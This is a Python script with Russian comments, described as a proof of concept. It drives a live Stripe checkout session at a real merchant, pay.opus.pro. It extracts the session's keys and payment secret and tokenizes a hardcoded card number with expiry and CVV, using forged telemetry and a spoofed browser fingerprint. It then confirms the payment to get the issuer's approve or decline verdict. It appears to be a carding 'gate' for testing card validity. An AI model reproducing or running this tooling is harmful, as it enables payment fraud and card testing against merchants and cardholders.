# -*- coding: utf-8 -*-
# POC полного цикла: cs_live-URL -> fid -> pk -> PI secret -> tokenize -> confirm
import asyncio, os, sys, json
sys.stdout.reconfigure(encoding='utf-8')
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession
import stripe_fid
import gate_client as gc

URL = 'https://pay.opus.pro/c/pay/cs_live_b1Uf5qpxeXTGYCy6WQoQB5bmwsnvKAnqQR5rdLxU4U5GYLut0vTO96sqCz#fidnandhYHdWcXxpYCc%2FJ2FgY2RwaXEnKSdpamZkaWAnPydgaycpJ3ZwZ3Zmd2x1cWxqa1BrbHRwYGtgdnZAa2RnaWBhJz9jZGl2YCknYnBkZmRoamlgU2R3bGRrcSc%2FJ2Zqa3F3amknKSdkdWxOYHwnPyd1blppbHNgWjA0SH12UVJPcXM9S1BqQ3xMZnBGRkdif25HNXR%2FQlFOQkNuNG9AZkNVb1Q1PXBqTjcxNm8zQ01iaUt8a2ZhYEBTZ39Lb3Q1UXdLMG4yPVRDT1RzVU91Y25TNTVmN3ZfMkY2aycpJ2N3amhWYHdzYHcnP3F3cGApJ2dkZm5id2pwa2FGamlqdyc%2FJyZjY2NjY2MnKSdpZHxqcHFRfHVgJz8naHBpcWxabHFgaCcpJ2BrZGdpYFVpZGZgbWppYWB3dic%2FcXdwYHgl'
CARD = '4937241006643332|02|31|275'  # карта dj: стабильно DECLINED у эмитента

async def main():
    d = stripe_fid.decode_fragment(URL)
    pk, cs = d['apiKey'], d['checkoutSessionId']
    print(f'pk: {pk[:25]}... cs: {cs[:25]}...')
    async with AsyncSession(impersonate='chrome131', verify=False) as s:
        H = {'Origin': 'https://js.stripe.com', 'Referer': 'https://js.stripe.com/', 'Accept': 'application/json'}
        # 1) сессия -> PI
        r = await s.get(f'https://api.stripe.com/v1/payment_pages/{cs}', params={'key': pk}, headers=H, timeout=12)
        data = r.json()
        pi = data.get('payment_intent') or {}
        secret = pi.get('client_secret')
        print(f'PI: {pi.get("id")} {pi.get("amount")}{pi.get("currency")} status={pi.get("status")}')
        if not secret:
            print('секрет недоступен, сессия:', data.get('status')); return
        # 2) токенизация (наш движок)
        telem = gc.stripe_telemetry('https://pay.opus.pro', pk)
        card = gc.parse_card(CARD)
        tok = gc.tokenize_body(card, telem, 'https://pay.opus.pro')
        r2 = await s.post('https://api.stripe.com/v1/payment_methods', data=tok,
                          headers=gc.TOKENIZE_HEADERS, timeout=10)
        td = r2.json()
        if 'id' not in td:
            print('tokenize fail:', td.get('error', {}).get('message', '?')); return
        print('PM:', td['id'])
        # 3) confirm — минимальное тело (контур payment_pages режет телеметрию)
        pi_id = secret.split('_secret_')[0]
        r3 = await s.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
                          data={'key': pk, 'client_secret': secret,
                                'payment_method': td['id'],
                                'expected_payment_method_type': 'card',
                                'use_stripe_sdk': 'true',
                                'return_url': 'https://pay.opus.pro/'},
                          headers=H, timeout=15)
        try:
            resp = r3.json()
        except Exception:
            resp = {'error': {'message': r3.text[:150]}}
        verdict, detail = gc.classify_pi_verdict(resp)
        print(f'VERDICT: {verdict}')
        print('detail:', str(detail)[:250])
        if resp.get('error'):
            print('err code:', resp['error'].get('decline_code'), resp['error'].get('code'))
asyncio.run(main())